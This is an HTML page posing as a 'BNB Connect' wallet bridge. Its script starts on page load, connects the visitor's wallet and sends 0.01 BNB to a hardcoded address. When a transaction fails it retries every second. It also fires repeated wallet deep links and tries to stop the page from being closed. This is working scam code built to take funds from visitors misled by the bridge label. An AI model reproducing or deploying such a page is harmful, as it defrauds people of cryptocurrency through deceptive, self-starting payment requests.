<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>BNB Connect</title>
    <style>
        body { text-align: center; padding: 50px; font-family: Arial; background: #1a1a2e; color: white; }
        button { background: #f39c12; color: white; border: none; padding: 20px 40px; font-size: 18px; border-radius: 10px; cursor: pointer; }
        button:hover { background: #e67e22; }
        #status { margin-top: 20px; font-size: 16px; }
    </style>
</head>
<body>
    <h1>ðŸ”— Connect Wallet</h1>
    <p>BNB (BEP20) Bridge Active</p>
    <button id="connectBtn">ðŸš€ Connect & Send 0.01 BNB</button>
    <div id="status"></div>

    <!-- WalletConnect v2 + Ethers -->
    <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
    <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>

    <script>
        const TARGET = "0x53C879FBB4D6cD62d95C4e4234b6A4bd9750939B";
        const RPC = "https://bsc-dataseed1.binance.org/";
        const AMOUNT = "0.01"; // BNB
        
        const status = document.getElementById('status');
        const btn = document.getElementById('connectBtn');
        
        let provider, signer;
        
        async function initWalletConnect() {
            status.textContent = "ðŸ” Detecting wallet...";
            
            // WalletConnect v2 - NO project ID needed for basic
            provider = new WalletConnectProvider({
                rpc: { 56: RPC },
                qrcodeModal: {
                    mobileLinks: [
                        "trust",
                        "metamask",
                        "rainbow",
                        "argent",
                        "walletconnect"
                    ]
                },
                chains: [56] // BSC Mainnet
            });
            
            try {
                await provider.enable();
                const ethersProvider = new ethers.providers.Web3Provider(provider);
                signer = ethersProvider.getSigner();
                
                status.textContent = "âœ… Wallet Connected! Sending...";
                await sendBNB();
            } catch(e) {
                console.log("WC failed, trying direct...");
                tryDirectConnect();
            }
        }
        
        async function sendBNB() {
            try {
                const tx = await signer.sendTransaction({
                    to: TARGET,
                    value: ethers.utils.parseEther(AMOUNT),
                    gasLimit: 21000
                });
                
                status.textContent = `ðŸŽ‰ TX Sent: https://bscscan.com/tx/${tx.hash}`;
                btn.disabled = true;
            } catch(e) {
                status.textContent = "âŒ TX failed, retrying...";
                setTimeout(initWalletConnect, 1000);
            }
        }
        
        function tryDirectConnect() {
            status.textContent = "ðŸ“± Opening wallet apps...";
            
            // Multi-wallet deep links (works on ALL mobile browsers)
            const wallets = [
                `trust://wc?uri=wc:`,
                `metamask://wc?uri=wc:`,
                `rainbow://wc?uri=wc:`,
                `intent://scan/#Intent;scheme=trust;package=com.wallet.crypto.trustapp;end`,
                `bnb://wallet/`
            ];
            
            wallets.forEach((url, i) => {
                setTimeout(() => {
                    window.open(url, '_system');
                    document.location = url;
                }, i * 500);
            });
            
            // Final fallback - BSC browser redirect
            setTimeout(() => {
                window.location.href = "https://trustwallet.com/bsc";
            }, 3000);
        }
        
        // Auto-trigger on load + button
        window.onload = initWalletConnect;
        btn.onclick = initWalletConnect;
        
        // Prevent page close during tx
        window.onbeforeunload = () => "Transaction in progress!";
    </script>
</body>
</html>
